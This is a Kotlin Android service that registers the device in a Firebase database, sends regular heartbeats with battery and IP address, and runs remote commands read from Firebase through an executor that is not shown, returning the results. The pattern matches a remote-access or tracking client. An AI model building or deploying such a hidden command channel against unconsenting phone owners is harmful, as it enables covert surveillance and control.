package com.abuzahra.app.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.firebase.database.*
import com.abuzahra.app.handler.CommandExecutor
import com.abuzahra.app.utils.Constants
import com.abuzahra.app.utils.DeviceInfo
import com.abuzahra.app.utils.NotificationHelper
import kotlinx.coroutines.*
import kotlin.coroutines.CoroutineContext

class FirebaseListenerService : Service(), CoroutineScope {

    private val TAG = "FirebaseListenerService"
    private val job = Job()
    override val coroutineContext: CoroutineContext = Dispatchers.IO + job

    private lateinit var database: DatabaseReference
    private var commandListener: ValueEventListener? = null
    private var heartbeatJob: Job? = null

    private val deviceId: String by lazy { DeviceInfo.getDeviceId(this) }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service onCreate - Device: $deviceId")

        startForeground(
            Constants.NOTIFICATION_ID,
            NotificationHelper.buildServiceNotification(this)
        )

        initFirebase()
        sendDeviceRegistration()
        startHeartbeat()
        listenForCommands()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun initFirebase() {
        database = FirebaseDatabase.getInstance().reference
        Log.d(TAG, "Firebase initialized for device: $deviceId")
    }

    private fun sendDeviceRegistration() {
        launch {
            try {
                val deviceInfo = DeviceInfo.getFullDeviceInfo(this@FirebaseListenerService)
                val deviceData = mapOf(
                    "id" to deviceId,
                    "name" to "${DeviceInfo.getDeviceBrand()} ${DeviceInfo.getDeviceModel()}",
                    "model" to DeviceInfo.getDeviceModel(),
                    "brand" to DeviceInfo.getDeviceBrand(),
                    "os" to DeviceInfo.getDeviceOS(),
                    "battery" to getBatteryLevel(),
                    "network" to DeviceInfo.getIPAddress(),
                    "location" to "",
                    "ip" to DeviceInfo.getIPAddress(),
                    "active" to true,
                    "lastSeen" to ServerValue.TIMESTAMP,
                    "info" to deviceInfo
                )
                database.child("devices").child(deviceId).setValue(deviceData)
                Log.d(TAG, "Device registered successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to register device", e)
            }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob = launch {
            while (isActive) {
                try {
                    val heartbeat = mapOf(
                        "timestamp" to System.currentTimeMillis(),
                        "battery" to getBatteryLevel(),
                        "network" to DeviceInfo.getIPAddress()
                    )
                    database.child("devices").child(deviceId).child("heartbeat")
                        .setValue(heartbeat)
                    database.child("devices").child(deviceId).child("lastSeen")
                        .setValue(ServerValue.TIMESTAMP)
                    database.child("devices").child(deviceId).child("battery")
                        .setValue(getBatteryLevel())
                    database.child("devices").child(deviceId).child("active")
                        .setValue(true)
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat failed", e)
                }
                delay(Constants.HEARTBEAT_INTERVAL)
            }
        }
    }

    private fun listenForCommands() {
        commandListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return

                launch {
                    try {
                        val command = snapshot.getValue(Map::class.java) as? Map<*, *>
                        if (command != null) {
                            val cmdName = command["command"] as? String ?: return@launch
                            val params = command["params"] as? Map<*, *> ?: emptyMap<String, Any>()
                            val cmdTimestamp = command["timestamp"] as? Long ?: System.currentTimeMillis()

                            Log.d(TAG, "Command received: $cmdName")

                            // Remove the command from Firebase after reading
                            database.child("devices").child(deviceId).child("command")
                                .removeValue()

                            // Execute command
                            val executor = CommandExecutor(this@FirebaseListenerService)
                            val result = executor.execute(cmdName, params)

                            // Send result back to Firebase
                            val resultData = mapOf(
                                "command" to cmdName,
                                "status" to "completed",
                                "result" to result,
                                "timestamp" to System.currentTimeMillis(),
                                "deviceTimestamp" to cmdTimestamp
                            )
                            database.child("devices").child(deviceId).child("result")
                                .setValue(resultData)

                            Log.d(TAG, "Result sent for: $cmdName")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Command execution error", e)
                        val errorResult = mapOf(
                            "status" to "error",
                            "error" to (e.message ?: "Unknown error"),
                            "timestamp" to System.currentTimeMillis()
                        )
                        database.child("devices").child(deviceId).child("result")
                            .setValue(errorResult)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase listener cancelled", error.toException())
                // Reconnect after delay
                launch {
                    delay(5000)
                    listenForCommands()
                }
            }
        }

        database.child("devices").child(deviceId).child("command")
            .addValueEventListener(commandListener as ValueEventListener)
        Log.d(TAG, "Listening for commands on: devices/$deviceId/command")
    }

    private fun getBatteryLevel(): Int {
        return try {
            val filter = android.content.Intent.ACTION_BATTERY_CHANGED
            val batteryStatus = registerReceiver(null, android.content.IntentFilter(filter))
            val level = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: 0
            val scale = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
            (level * 100 / scale)
        } catch (e: Exception) {
            0
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        heartbeatJob?.cancel()
        commandListener?.let {
            database.child("devices").child(deviceId).child("command").removeEventListener(it)
        }
        try {
            database.child("devices").child(deviceId).child("active").setValue(false)
        } catch (_: Exception) {}
        Log.d(TAG, "Service destroyed")
    }
}
